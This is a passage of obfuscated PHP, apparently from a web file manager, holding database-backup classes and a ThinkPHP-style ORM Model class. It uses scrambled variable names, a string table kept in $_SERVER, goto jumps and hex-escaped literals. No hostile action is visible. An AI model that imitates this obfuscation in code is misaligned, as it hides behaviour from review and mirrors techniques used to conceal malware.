$“ιΓ†Βψ[$΅Ό‡ξ‰[830]] == $΅Ό‡ξ‰[91]) { continue; } if (!empty($“ιΓ†Βψ[$΅Ό‡ξ‰[32]]) && in_array($“ιΓ†Βψ[$΅Ό‡ξ‰[32]], $¬ΌΖ)) { continue; } $this->model->remove($“ιΓ†Βψ[$΅Ό‡ξ‰[478]]); $’μϊύ = $this->backupPath($”«—¨», $–«¨”Ή); IO::remove($’μϊύ, !1); } } private function backupPath($¥΄ϊΪΛδ, $‡›©μ›ψ = false) { $―Ϊο°— =& $_SERVER[γγάψ½]; if (!$‡›©μ›ψ) { $‡›©μ›ψ = Model($―Ϊο°—[845])->get($―Ϊο°—[846]); } $Ϊσ¦Ι¶ = $¥΄ϊΪΛδ[$―Ϊο°—[32]]; $ΧβΤ Τ½ = substr(md5($―Ϊο°—[847] . $‡›©μ›ψ . $Ϊσ¦Ι¶), 0, 8); return "\x7b\x69\157\72{$¥΄ϊΪΛδ[$―Ϊο°—[827]]}\x7d\x2f\144\x61\164\x61\x62\x61\x73\x65\x2f\142\141\143\153\x75\160\57" . $Ϊσ¦Ι¶ . $―Ϊο°—[11] . $ΧβΤ Τ½; } public function db() { $άΓ«η‹Ν =& $_SERVER[γγάψ½]; $εψΎ“™  = self::get(); if (_get($εψΎ“™ , $άΓ«η‹Ν[848], 0) == $άΓ«η‹Ν[91]) { return !0; } $®σΥΫµ = new BackupDb(); if (!$®σΥΫµ->index()) { return !1; } self::set(array($άΓ«η‹Ν[848] => 1)); return !0; } public function dbFile() { $®”Δ»΄θ =& $_SERVER[γγάψ½]; $—ζΒΜ™‰ = self::get(); if (_get($—ζΒΜ™‰, $®”Δ»΄θ[849], 0) == $®”Δ»΄θ[91]) { return !0; } $βοήϊ = new BackupDbFile(); if (!$βοήϊ->index()) { return !1; } self::set(array($®”Δ»΄θ[849] => 1)); return !0; } public function file() { $„τοάβ± =& $_SERVER[γγάψ½]; $›μ‘ύ = self::get(); if (_get($›μ‘ύ, $„τοάβ±[850], 0) == $„τοάβ±[91]) { return !0; } if ($›μ‘ύ[$„τοάβ±[171]] == $„τοάβ±[851]) { $ΰ®πςΘτ = new BackupFile(); if (!$ΰ®πςΘτ->index()) { return !1; } } self::set(array($„τοάβ±[850] => 1, $„τοάβ±[825] => 1)); return !0; } public static function log($μ‡μΗ“) { write_log($μ‡μΗ“, $_SERVER[γγάψ½][852]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Θ²†‡« =& $_SERVER[γγάψ½]; $¶Ν®δΠ© = Backup::get(); self::$io = $¶Ν®δΠ©[$Θ²†‡«[827]]; self::$name = $¶Ν®δΠ©[$Θ²†‡«[32]]; $¶μ«ΙΉΖ = new DbManage(); $ί©…Α = $¶μ«ΙΉΖ->dbType(); $ΩΩ‚Ν­ = array($Θ²†‡«[853] => $ί©…Α, $Θ²†‡«[854] => time()); Backup::set($ΩΩ‚Ν­); $€δνέΨ© = $this->tmpFilesPath() . $Θ²†‡«[855] . self::$name . $Θ²†‡«[8]; del_dir($€δνέΨ©); mk_dir($€δνέΨ©); $ΓΪµή‰ = $–σΡχ λ = 0; try { $τςΧϋΫ­ = $¶μ«ΙΉΖ->db()->getTables(); } catch (Exception $©ά―άγσ) { Backup::log($Θ²†‡«[856] . $©ά―άγσ->getMessage()); return !1; } $τςΧϋΫ­ = array_diff($τςΧϋΫ­, array($Θ²†‡«[857], $Θ²†‡«[858])); foreach ($τςΧϋΫ­ as $¨ΠΈΩ) { if ($¨ΠΈΩ == $Θ²†‡«[859]) { continue; } $ΓΪµή‰ += $¶μ«ΙΉΖ->model($¨ΠΈΩ)->count(); } $Ώ‹Ε†Β = new Task($Θ²†‡«[860], $Θ²†‡«[852], $ΓΪµή‰, LNG($Θ²†‡«[861]) . $Θ²†‡«[862] . LNG($Θ²†‡«[863])); $GLOBALS[$Θ²†‡«[864]] = self::$name; foreach ($τςΧϋΫ­ as $¨ΠΈΩ) { $©”§θ« = $€δνέΨ© . $¨ΠΈΩ . $Θ²†‡«[865]; if ($¨ΠΈΩ == $Θ²†‡«[859]) { @touch($©”§θ«); continue; } $ϋλ΅ΧΓο = null; if ($¨ΠΈΩ == $Θ²†‡«[866] && $¶Ν®δΠ©[$Θ²†‡«[171]] == $Θ²†‡«[851]) { $ϋλ΅ΧΓο = self::$io; } $–σΡχ λ += $¶μ«ΙΉΖ->sqlFromDb($¨ΠΈΩ, $©”§θ«, $Ώ‹Ε†Β, $ϋλ΅ΧΓο); } unset($GLOBALS[$Θ²†‡«[864]]); $Ώ‹Ε†Β->end(); if ($–σΡχ λ > $ΓΪµή‰) { $ΓΪµή‰ = $–σΡχ λ; } $ΩΩ‚Ν­ = array($Θ²†‡«[853] => $ί©…Α, $Θ²†‡«[848] => 1, $Θ²†‡«[867] => $ΓΪµή‰, $Θ²†‡«[868] => $–σΡχ λ, $Θ²†‡«[869] => time()); Backup::set($ΩΩ‚Ν­); if ($ΓΪµή‰ - $–σΡχ λ > 0) { $Φ”“Έ = $Θ²†‡«[870]; if (!stristr(I18n::getType(), $Θ²†‡«[871])) { $Φ”“Έ = $Θ²†‡«[872]; } Backup::log(array($Φ”“Έ, $ΩΩ‚Ν­)); return !1; } return !0; } private function tmpFilesPath() { $ ίξ =& $_SERVER[γγάψ½]; $‹χ―δ«Ζ = TEMP_FILES; if ($GLOBALS[$ ίξ[6]][$ ίξ[92]][$ ίξ[873]]) { $‹χ―δ«Ζ = $GLOBALS[$ ίξ[6]][$ ίξ[92]][$ ίξ[873]]; if (!mk_dir($‹χ―δ«Ζ) || !is_writable($‹χ―δ«Ζ) || !IO::mkfile($‹χ―δ«Ζ . $ ίξ[874])) { $‹χ―δ«Ζ = TEMP_FILES; } } return $‹χ―δ«Ζ; } } goto F†’½νρ­; B¬νφη½αυ: define($_SERVER[γγάψ½][323], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\x6c\145", "\157\162\144\145\x72", "\x61\154\x69\x61\163", "\x68\141\166\x69\x6e\147", "\147\162\157\165\x70", "\x6c\157\x63\153", "\144\x69\x73\164\x69\x6e\x63\x74", "\141\x75\x74\157", "\146\151\x6c\164\x65\162", "\166\x61\x6c\151\x64\x61\164\x65", "\x72\145\x73\165\154\x74", "\x62\x69\x6e\144", "\164\x6f\x6b\145\156"); public function __construct($“ΎυΈΛ« = '', $ιΨωΙσ = '', $ΠιΓ¥ι = '') { $“άΔύ•— =& $_SERVER[γγάψ½]; $this->_initialize(); if (!empty($“ΎυΈΛ«)) { if (strpos($“ΎυΈΛ«, $“άΔύ•—[10])) { list($this->dbName, $this->name) = explode($“άΔύ•—[10], $“ΎυΈΛ«); } else { $this->name = $“ΎυΈΛ«; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ιΨωΙσ)) { $this->tablePrefix = $“άΔύ•—[12]; } elseif ($“άΔύ•—[12] != $ιΨωΙσ) { $this->tablePrefix = $ιΨωΙσ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($“άΔύ•—[324]); } $this->db(0, empty($this->connection) ? $ΠιΓ¥ι : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ύοξΉ®α =& $_SERVER[γγάψ½]; if (empty($this->fields)) { if (think_config($ύοξΉ®α[325])) { $’ΗΉΟ = $this->dbName ? $this->dbName : think_config($ύοξΉ®α[326]); $¬–‰›νά = think_var_cache($ύοξΉ®α[327] . strtolower(get_path_this($’ΗΉΟ) . $ύοξΉ®α[10] . $this->name)); if ($¬–‰›νά) { $ΤΛέ” = think_config($ύοξΉ®α[328]); if (empty($ΤΛέ”) || $¬–‰›νά[$ύοξΉ®α[329]] == $ΤΛέ”) { $this->fields = $¬–‰›νά; return; } } } $this->flush(); } } public function flush() { $βλΩίΑ— =& $_SERVER[γγάψ½]; $this->db->setModel($this->name); $Π›Βς® = $this->db->getFields($this->getTableName()); if (!$Π›Βς®) { return !1; } $this->fields = array_keys($Π›Βς®); $this->fields[$βλΩίΑ—[330]] = !1; foreach ($Π›Βς® as $΄ΊϋυΌ => $άΥ¥Ά„) { $™Ρ†­Ώ’[$΄ΊϋυΌ] = $άΥ¥Ά„[$βλΩίΑ—[33]]; if ($άΥ¥Ά„[$βλΩίΑ—[39]]) { $this->fields[$βλΩίΑ—[331]] = $΄ΊϋυΌ; if ($άΥ¥Ά„[$βλΩίΑ—[42]]) { $this->fields[$βλΩίΑ—[330]] = !0; } } } $this->fields[$βλΩίΑ—[332]] = $™Ρ†­Ώ’; if (think_config($βλΩίΑ—[328])) { $this->fields[$βλΩίΑ—[329]] = think_config($βλΩίΑ—[328]); } if (think_config($βλΩίΑ—[325])) { $η”Ι›Θ = $this->dbName ? $this->dbName : think_config($βλΩίΑ—[326]); think_var_cache($βλΩίΑ—[327] . strtolower(get_path_this($η”Ι›Θ) . $βλΩίΑ—[10] . $this->name), $this->fields); } } public function switchModel($Ησ¶΅, $„Ϋ΅ΊΙ­ = array()) { $¶Δ±‘Ξ‰ =& $_SERVER[γγάψ½]; $“ωΓ“’ν = ucwords(strtolower($Ησ¶΅)) . $¶Δ±‘Ξ‰[333]; if (!class_exists($“ωΓ“’ν)) { think_exception($“ωΓ“’ν . think_lang($¶Δ±‘Ξ‰[334])); } $this->_extModel = new $“ωΓ“’ν($this->name); if (!empty($„Ϋ΅ΊΙ­)) { foreach ($„Ϋ΅ΊΙ­ as $Δ’Ζ—Λ‹) { $this->_extModel->setProperty($Δ’Ζ—Λ‹, $this->{$Δ’Ζ—Λ‹}); } } return $this->_extModel; } public function __set($™Τ¨ύΥ®, $ΌΓμΫΝ) { $this->data[$™Τ¨ύΥ®] = $ΌΓμΫΝ; } public function __get($ϋώ¨΄‚›) { return isset($this->data[$ϋώ¨΄‚›]) ? $this->data[$ϋώ¨΄‚›] : null; } public function __isset($ϊΆ³ν…ΰ) { return isset($this->data[$ϊΆ³ν…ΰ]); } public function __unset($‚Φ²¬ΦΪ) { unset($this->data[$‚Φ²¬ΦΪ]); } public function __call($Λ¥Ί«³ΰ, $ ΊΧΧ’) { $ΐΊΩƒ―­ =& $_SERVER[γγάψ½]; if (in_array(strtolower($Λ¥Ί«³ΰ), $this->methods, !0)) { $this->options[strtolower($Λ¥Ί«³ΰ)] = $ ΊΧΧ’[0]; return $this; } elseif (in_array(strtolower($Λ¥Ί«³ΰ), array($ΐΊΩƒ―­[335], $ΐΊΩƒ―­[336], $ΐΊΩƒ―­[337], $ΐΊΩƒ―­[338], $ΐΊΩƒ―­[339]), !0)) { $οζ›³‘ = isset($ ΊΧΧ’[0]) ? $ ΊΧΧ’[0] : $ΐΊΩƒ―­[223]; $οζ›³‘ = $this->db->parseKey($οζ›³‘); return $this->getField(strtoupper($Λ¥Ί«³ΰ) . $ΐΊΩƒ―­[340] . $οζ›³‘ . $ΐΊΩƒ―­[341] . $Λ¥Ί«³ΰ, $ΐΊΩƒ―­[335]); } elseif (strtolower(substr($Λ¥Ί«³ΰ, 0, 5)) == $ΐΊΩƒ―­[342]) { $οζ›³‘ = think_parse_name(substr($Λ¥Ί«³ΰ, 5)); $ς­¦¤ό[$οζ›³‘] = $ ΊΧΧ’[0]; return $this->where($ς­¦¤ό)->find(); } elseif (strtolower(substr($Λ¥Ί«³ΰ, 0, 10)) == $ΐΊΩƒ―­[343]) { $Ή¤Η›„ = think_parse_name(substr($Λ¥Ί«³ΰ, 10)); $ς­¦¤ό[$Ή¤Η›„] = $ ΊΧΧ’[0]; return $this->where($ς­¦¤ό)->getField($ ΊΧΧ’[1]); } elseif (isset($this->_scope[$Λ¥Ί«³ΰ])) { return $this->scope($Λ¥Ί«³ΰ, $ ΊΧΧ’[0]); } elseif (method_exists($this, $Λ¥Ί«³ΰ)) { array_unshift($ ΊΧΧ’, $Λ¥Ί«³ΰ); return call_user_func_array(array($this, $ΐΊΩƒ―­[344]), $ ΊΧΧ’); } else { return call_user_func_array(array(parent, $Λ¥Ί«³ΰ), $ ΊΧΧ’); } } protected function call() { $ωίφςγ½ =& $_SERVER[γγάψ½]; $Ήτΰ…Ω = func_get_args(); $βΩ¶„Ό© = array_shift($Ήτΰ…Ω); $’ΪζΛ = $βΩ¶„Ό©; if (is_array($βΩ¶„Ό©)) { $’ΪζΛ = $βΩ¶„Ό©[1]; $βΩ¶„Ό© = $βΩ¶„Ό©[0]; } $ϋ’ρΠόΝ = count($Ήτΰ…Ω) - 1; if (isset($Ήτΰ…Ω[$ϋ’ρΠόΝ]) && $Ήτΰ…Ω[$ϋ’ρΠόΝ] === $βΩ¶„Ό©) { think_exception(__CLASS__ . $ωίφςγ½[4] . $βΩ¶„Ό© . think_lang($ωίφςγ½[345])); return; } $Ήτΰ…Ω[] = $βΩ¶„Ό©; if (method_exists($this, $ωίφςγ½[346])) { $ύΆ· Β = call_user_func_array(array($this, $ωίφςγ½[347]), array($’ΪζΛ, $Ήτΰ…Ω)); if (!is_null($ύΆ· Β) && $ύΆ· Β !== !1) { return $ύΆ· Β; } } $Ν”Ηϋε = call_user_func_array(array($this, $βΩ¶„Ό©), $Ήτΰ…Ω); if (method_exists($this, $ωίφςγ½[348])) { $ύΆ· Β = call_user_func_array(array($this, $ωίφςγ½[349]), array($’ΪζΛ, $Ήτΰ…Ω, $Ν”Ηϋε)); if ($ύΆ· Β) { return $ύΆ· Β; } } return $Ν”Ηϋε; } protected function _initialize() { } protected function _facade($†Ϊ«οΌ) { $…ωΞΌ =& $_SERVER[γγάψ½]; if (!empty($this->fields)) { foreach ($†Ϊ«οΌ as $ςύσΘπ => $°ζλ–Φ) { if (is_array($this->fields) && !in_array($ςύσΘπ, $this->fields, !0)) { unset($†Ϊ«οΌ[$ςύσΘπ]); } elseif (is_scalar($°ζλ–Φ)) { $this->_parseType($†Ϊ«οΌ, $ςύσΘπ); } } } if (!empty($this->options[$…ωΞΌ[350]])) { $†Ϊ«οΌ = array_map($this->options[$…ωΞΌ[350]], $†Ϊ«οΌ); unset($this->options[$…ωΞΌ[350]]); } $this->_beforeWrite($†Ϊ«οΌ); return $†Ϊ«οΌ; } protected function _beforeWrite(&$©ΎΠΒ‰) { } public function add($ε‰φΨς = '', $Π€‘δΣ’ = array(), $ΫΞΉυκ = false) { if (empty($ε‰φΨς)) { if (!empty($this->data)) { $ε‰φΨς = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[γγάψ½][351]); return !1; } } $Π€‘δΣ’ = $this->_parseOptions($Π€‘δΣ’); $ε‰φΨς = $this->_facade($ε‰φΨς); if (!1 === $this->_beforeInsert($ε‰φΨς, $Π€‘δΣ’)) { return !1; } $ζ»ή‘ς = $this->db->insert($ε‰φΨς, $Π€‘δΣ’, $ΫΞΉυκ); if (!1 !== $ζ»ή‘ς) { $ξυ³…‹ε = $this->getLastInsID(); if ($ξυ³…‹ε) { $ε‰φΨς[$this->getPk()] = $ξυ³…‹ε; $this->_after_insert($ε‰φΨς, $Π€‘δΣ’); return $ξυ³…‹ε; } $this->_after_insert($ε‰φΨς, $Π€‘δΣ’); } return $ζ»ή‘ς; } protected function _beforeInsert(&$”η€ΎΔ, $βΉ³¤δΨ) { } protected function _after_insert($Θ¥ι³ΎΊ, $Ώ’Χ†Ζ) { } public function addAll($ΐ΄σΗΆ, $κ‹Έ·ΰσ = array(), $¦ρς¥­Α = false) { $ν¤°ό¦Ξ =& $_SERVER[γγάψ½]; if (empty($ΐ΄σΗΆ)) { $this->error = think_lang($ν¤°ό¦Ξ[351]); return !1; } $κ‹Έ·ΰσ = $this->_parseOptions($κ‹Έ·ΰσ); foreach ($ΐ΄σΗΆ as $πΜΝΣΐ => $όχύ–Έ½) { $ΐ΄σΗΆ[$πΜΝΣΐ] = $this->_facade($όχύ–Έ½); } if (method_exists($this->db, $ν¤°ό¦Ξ[352])) { $ώπ²ιΪ = $this->db->insertAll($ΐ΄σΗΆ, $κ‹Έ·ΰσ, $¦ρς¥­Α); } else { $this->startTrans(); foreach ($ΐ΄σΗΆ as $πΜΝΣΐ => $όχύ–Έ½) { $ώπ²ιΪ = $this->db->insert($όχύ–Έ½, $κ‹Έ·ΰσ, $¦ρς¥­Α); } $this->commit(); } if (!1 !== $ώπ²ιΪ) { $·΅λψΤ = $this->getLastInsID(); if ($·΅λψΤ) { return $·΅λψΤ; } } return $ώπ²ιΪ; } public function selectAdd($Δέ¶“› = '', $‚Β³ψξ· = '', $“ΖΏ›Φΰ = array()) { $ΐΉΡΎζƒ =& $_SERVER[γγάψ½]; $“ΖΏ›Φΰ = $this->_parseOptions($“ΖΏ›Φΰ); if (!1 === ($Υ†Ξ«Γ = $this->db->selectInsert($Δέ¶“› ? $Δέ¶“› : $“ΖΏ›Φΰ[$ΐΉΡΎζƒ[353]], $‚Β³ψξ· ? $‚Β³ψξ· : $this->getTableName(), $“ΖΏ›Φΰ))) { $this->error = think_lang($ΐΉΡΎζƒ[354]); return !1; } else { return $Υ†Ξ«Γ; } } public function save($δΦδξϋ = '', $ό‰ΏφΛ = array()) { $ΈΊ‰ =& $_SERVER[γγάψ½]; if (empty($δΦδξϋ)) { if (!empty($this->data)) { $δΦδξϋ = $this->data; $this->data = array(); } else { $this->error = think_lang($ΈΊ‰[351]); return !1; } } $δΦδξϋ = $this->_facade($δΦδξϋ); $ό‰ΏφΛ = $this->_parseOptions($ό‰ΏφΛ); $ηφΖΡ•§ = $this->getPk(); if (!isset($ό‰ΏφΛ[$ΈΊ‰[355]])) { if (isset($δΦδξϋ[$ηφΖΡ•§])) { $Σ…·…¦Ω[$ηφΖΡ•§] = $δΦδξϋ[$ηφΖΡ•§]; $ό‰ΏφΛ[$ΈΊ‰[355]] = $Σ…·…¦Ω; unset($δΦδξϋ[$ηφΖΡ•§]); } else { $this->error = think_lang($ΈΊ‰[354]); return !1; } } if (is_array($ό‰ΏφΛ[$ΈΊ‰[355]]) && isset($ό‰ΏφΛ[$ΈΊ‰[355]][$ηφΖΡ•§])) { $™΄”©› = $ό‰ΏφΛ[$ΈΊ‰[355]][$ηφΖΡ•§]; } if (!1 === $this->_beforeUpdate($δΦδξϋ, $ό‰ΏφΛ)) { return !1; } $«ίΓέ = $this->db->update($δΦδξϋ, $ό‰ΏφΛ); if (!1 !== $«ίΓέ) { if (isset($™΄”©›)) { $δΦδξϋ[$ηφΖΡ•§] = $™΄”©›; } $this->_afterUpdate($δΦδξϋ, $ό‰ΏφΛ); } return $«ίΓέ; } protected function _beforeUpdate(&$ƒΓΰ¶ƒ, $¬¨τ―ί) { } protected function _afterUpdate($ΦƒπΤψί, $™Μ«Κ) { } public function delete($ή«ΤΦ¬ = array()) { $Τκ—σΣ =& $_SERVER[γγάψ½]; if (empty($ή«ΤΦ¬) && empty($this->options[$Τκ—σΣ[355]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ΔιΣ† = $this->getPk(); if (is_numeric($ή«ΤΦ¬) || is_string($ή«ΤΦ¬)) { if (strpos($ή«ΤΦ¬, $Τκ—σΣ[50])) { $ει£χ[$ΔιΣ†] = array($Τκ—σΣ[356], $ή«ΤΦ¬); } else { $ει£χ[$ΔιΣ†] = $ή«ΤΦ¬; } $this->options[$Τκ—σΣ[355]] = $ει£χ; } $ή«ΤΦ¬ = $this->_parseOptions(); if (is_array($ή«ΤΦ¬[$Τκ—σΣ[355]]) && isset($ή«ΤΦ¬[$Τκ—σΣ[355]][$ΔιΣ†])) { $γΎΚσηΉ = $ή«ΤΦ¬[$Τκ—σΣ[355]][$ΔιΣ†]; } $μΓ½’­ν = $this->db->delete($ή«ΤΦ¬); if (!1 !== $μΓ½’­ν) { $‹£δµ¶ = array(); if (isset($γΎΚσηΉ)) { $‹£δµ¶[$ΔιΣ†] = $γΎΚσηΉ; } $this->_after_delete($‹£δµ¶, $ή«ΤΦ¬); } return $μΓ½’­ν; } protected function _after_delete($®ΙΪΙύχ, $Ξ¨πΏ–) { } public function select($κψϋ΄ = array()) { $΄Ξψώ =& $_SERVER[γγάψ½]; if (is_string($κψϋ΄) || is_numeric($κψϋ΄)) { $ϊ”‰η§Κ = $this->getPk(); if (strpos($κψϋ΄, $΄Ξψώ[50])) { $ΆΤμήξΪ[$ϊ”‰η§Κ] = array($΄Ξψώ[356], $κψϋ΄); } else { $ΆΤμήξΪ[$ϊ”‰η§Κ] = $κψϋ΄; } $this->options[$΄Ξψώ[355]] = $ΆΤμήξΪ; } elseif (!1 === $κψϋ΄) { $κψϋ΄ = $this->_parseOptions(); return $΄Ξψώ[357] . $this->db->buildSelectSql($κψϋ΄) . $΄Ξψώ[358]; } $κψϋ΄ = $this->_parseOptions(); $όβΆΟο = $this->db->select($κψϋ΄); if (!1 === $όβΆΟο) { return !1; } if (empty($όβΆΟο)) { return null; } $this->_afterSelect($όβΆΟο, $κψϋ΄); return $όβΆΟο; } protected function _afterSelect(&$Ν§ΕΥ£, $΄φΌΡυΤ) { } public function buildSql($§σ”ΎΌ’ = array()) { $ς¶³‡Σύ =& $_SERVER[γγάψ½]; $§σ”ΎΌ’ = $this->_parseOptions($§σ”ΎΌ’); return $ς¶³‡Σύ[357] . $this->db->buildSelectSql($§σ”ΎΌ’) . $ς¶³‡Σύ[358]; } public function optionsValue($ήσ‹ύφ = null) { if (is_null($ήσ‹ύφ)) { return $this->options; } elseif (is_array($ήσ‹ύφ)) { $this->options = array_merge($this->options, $ήσ‹ύφ); } } protected function _parseOptions($ΨΘΞίε΄ = array()) { $ώΒΆ·Γ =& $_SERVER[γγάψ½]; if (is_array($ΨΘΞίε΄)) { $ΨΘΞίε΄ = array_merge($this->options, $ΨΘΞίε΄); } $this->options = array(); if (!isset($ΨΘΞίε΄[$ώΒΆ·Γ[359]])) { $ΨΘΞίε΄[$ώΒΆ·Γ[359]] = $this->getTableName(); $Χ†Β΅ = $this->fields; } else { $Χ†Β΅ = $this->getDbFields(); } if (!empty($ΨΘΞίε΄[$ώΒΆ·Γ[360]])) { $ΨΘΞίε΄[$ώΒΆ·Γ[359]] .= $ώΒΆ·Γ[53] . $ΨΘΞίε΄[$ώΒΆ·Γ[360]]; } $ΨΘΞίε΄[$ώΒΆ·Γ[361]] = $this->name; if (isset($ΨΘΞίε΄[$ώΒΆ·Γ[355]]) && is_array($ΨΘΞίε΄[$ώΒΆ·Γ[355]]) && !empty($Χ†Β΅) && !isset($ΨΘΞίε΄[$ώΒΆ·Γ[362]]) && !isset($ΨΘΞίε΄[$ώΒΆ·Γ[359]])) { foreach ($ΨΘΞίε΄[$ώΒΆ·Γ[355]] as $χϋ•ξ => $ΐ•βΥΕι) { $χϋ•ξ = trim($χϋ•ξ); if (in_array($χϋ•ξ, $Χ†Β΅, !0)) { if (is_scalar($ΐ•βΥΕι)) { $this->_parseType($ΨΘΞίε΄[$ώΒΆ·Γ[355]], $χϋ•ξ); } } elseif (!is_numeric($χϋ•ξ) && $ώΒΆ·Γ[11] != substr($χϋ•ξ, 0, 1) && !1 === strpos($χϋ•ξ, $ώΒΆ·Γ[10]) && !1 === strpos($χϋ•ξ, $ώΒΆ·Γ[340]) && !1 === strpos($χϋ•ξ, $ώΒΆ·Γ[215]) && !1 === strpos($χϋ•ξ, $ώΒΆ·Γ[287])) { unset($ΨΘΞίε΄[$ώΒΆ·Γ[355]][$χϋ•ξ]); } } } $this->_options_filter($ΨΘΞίε΄); return $ΨΘΞίε΄; } protected function _options_filter(&$ϋψΖΤ­ς) { } protected function _parseType(&$υΓΛβΎ, $ζϋ”σ) { $νΙ­ΦΟπ =& $_SERVER[γγάψ½]; if (empty($this->options[$νΙ­ΦΟπ[363]][$νΙ­ΦΟπ[4] . $ζϋ”σ])) { $ΩαΨ²κ = strtolower($this->fields[$νΙ­ΦΟπ[332]][$ζϋ”σ]); if (!1 !== strpos($ΩαΨ²κ, $νΙ­ΦΟπ[364])) { } elseif (!1 === strpos($ΩαΨ²κ, $νΙ­ΦΟπ[365]) && !1 !== strpos($ΩαΨ²κ, $νΙ­ΦΟπ[366])) { $υΓΛβΎ[$ζϋ”σ] = intval($υΓΛβΎ[$ζϋ”σ]); } elseif (!1 !== strpos($ΩαΨ²κ, $νΙ­ΦΟπ[367]) || !1 !== strpos($ΩαΨ²κ, $νΙ­ΦΟπ[368])) { $υΓΛβΎ[$ζϋ”σ] = floatval($υΓΛβΎ[$ζϋ”σ]); } elseif (!1 !== strpos($ΩαΨ²κ, $νΙ­ΦΟπ[369])) { $υΓΛβΎ[$ζϋ”σ] = (bool) $υΓΛβΎ[$ζϋ”σ]; } } } public function find($³†ΓƒΨ = array()) { $³ΘΡΛΈ =& $_SERVER[γγάψ½]; if (is_numeric($³†ΓƒΨ) || is_string($³†ΓƒΨ)) { $δ…ΉΎΠ…[$this->getPk()] = intval($³†ΓƒΨ); $this->options[$³ΘΡΛΈ[355]] = $δ…ΉΎΠ…; } $this->options[$³ΘΡΛΈ[370]] = 1; $³†ΓƒΨ = $this->_parseOptions(); $Λέ¤ = $this->db->select($³†ΓƒΨ); if (!1 === $Λέ¤) { return !1; } if (empty($Λέ¤)) { return null; } $this->data = $Λέ¤[0]; $this->_afterFind($this->data, $³†ΓƒΨ); if (!empty($this->options[$³ΘΡΛΈ[371]])) { return $this->returnResult($this->data, $this->options[$³ΘΡΛΈ[371]]); } return $this->data; } protected function _afterFind(&$ήεΆ¶¨, $‹ΊΝ€Υ) { } protected function returnResult($£ήƒ΅ε—, $Ν†Γϊξ = '') { $¶έ·Θ€ =& $_SERVER[γγάψ½]; if ($Ν†Γϊξ) { if (is_callable($Ν†Γϊξ)) { return call_user_func($Ν†Γϊξ, $£ήƒ΅ε—); } switch (strtolower($Ν†Γϊξ)) { case $¶έ·Θ€[372]: return json_encode($£ήƒ΅ε—); case $¶έ·Θ€[373]: return xml_encode($£ήƒ΅ε—); } } return $£ήƒ΅ε—; } public function parseFieldsMap($Ά‚ήσ, $ΰΚεΚβ™ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $―ΚΝ => $Η©½΄Υ) { if ($ΰΚεΚβ™ == 1) { if (isset($Ά‚ήσ[$Η©½΄Υ])) { $Ά‚ήσ[$―ΚΝ] = $Ά‚ήσ[$Η©½΄Υ]; unset($Ά‚ήσ[$Η©½΄Υ]); } } else { if (isset($Ά‚ήσ[$―ΚΝ])) { $Ά‚ήσ[$Η©½΄Υ] = $Ά‚ήσ[$―ΚΝ]; unset($Ά‚ήσ[$―ΚΝ]); } } } } return $Ά‚ήσ; } public function setField($°ωα¦γ›, $…Ι®φ = '') { if (is_array($°ωα¦γ›)) { $½•γ Ο™ = $°ωα¦γ›; } else { $½•γ Ο™[$°ωα¦γ›] = $…Ι®φ; } return $this->save($½•γ Ο™); } public function setAdd($€Π΅η‘β, $ΝΧ¦’ = 1) { $‘‰ΛΙΎέ =& $_SERVER[γγάψ½]; $›—ΒΛΔ = $€Π΅η‘β . $‘‰ΛΙΎέ[374] . $ΝΧ¦’; if ($ΝΧ¦’ < 0) { $›—ΒΛΔ = $€Π΅η‘β . $ΝΧ¦’; } return $this->setField($€Π΅η‘β, array($‘‰ΛΙΎέ[375], $›—ΒΛΔ)); } public function getField($φυ½ϋϋ, $Ά”Ί― = null) { $φΕ–ψ£  =& $_SERVER[γγάψ½]; $ΚΒμά‰Φ[$φΕ–ψ£ [353]] = $φυ½ϋϋ; $ΚΒμά‰Φ = $this->_parseOptions($ΚΒμά‰Φ); $φυ½ϋϋ = trim($φυ½ϋϋ); if (strpos($φυ½ϋϋ, $φΕ–ψ£ [50])) { if (!isset($ΚΒμά‰Φ[$φΕ–ψ£ [370]])) { $ΚΒμά‰Φ[$φΕ–ψ£ [370]] = is_numeric($Ά”Ί―) ? $Ά”Ί― : $φΕ–ψ£ [12]; } $ΰΆ¥®Πη = $this->db->select($ΚΒμά‰Φ); if (!empty($ΰΆ¥®Πη)) { $«λ¬¶µ = explode($φΕ–ψ£ [50], $φυ½ϋϋ); $φυ½ϋϋ = array_keys($ΰΆ¥®Πη[0]); $ς©β–φα = array_shift($φυ½ϋϋ); $σ»Ί“ρ = array_shift($φυ½ϋϋ); $ƒνκΉΔϋ = array(); $ΪωΤ ¶β = count($«λ¬¶µ); foreach ($ΰΆ¥®Πη as $σΉκ¥…ό) { $‘Ζυ―“ω = $σΉκ¥…ό[$ς©β–φα]; if (2 == $ΪωΤ ¶β) { $ƒνκΉΔϋ[$‘Ζυ―“ω] = $σΉκ¥…ό[$σ»Ί“ρ]; } else { $ƒνκΉΔϋ[$‘Ζυ―“ω] = is_string($Ά”Ί―) ? implode($Ά”Ί―, $σΉκ¥…ό) : $σΉκ¥…ό; } } return $ƒνκΉΔϋ; } } else { if (!0 !== $Ά”Ί―) { $ΚΒμά‰Φ[$φΕ–ψ£ [370]] = is_numeric($Ά”Ί―) ? $Ά”Ί― : 1; } if ($Ά”Ί― === $φΕ–ψ£ [335]) { unset($ΚΒμά‰Φ[$φΕ–ψ£ [370]]); } $σΉκ¥…ό = $this->db->select($ΚΒμά‰Φ); if (!empty($σΉκ¥…ό)) { if ($Ά”Ί― === $φΕ–ψ£ [335]) { return reset($σΉκ¥…ό[0]); } if (!0 !== $Ά”Ί― && 1 == $ΚΒμά‰Φ[$φΕ–ψ£ [370]]) { return reset($σΉκ¥…ό[0]); } foreach ($σΉκ¥…ό as $ΨΠ—³µΏ) { $‘ƒΣύΧ©[] = 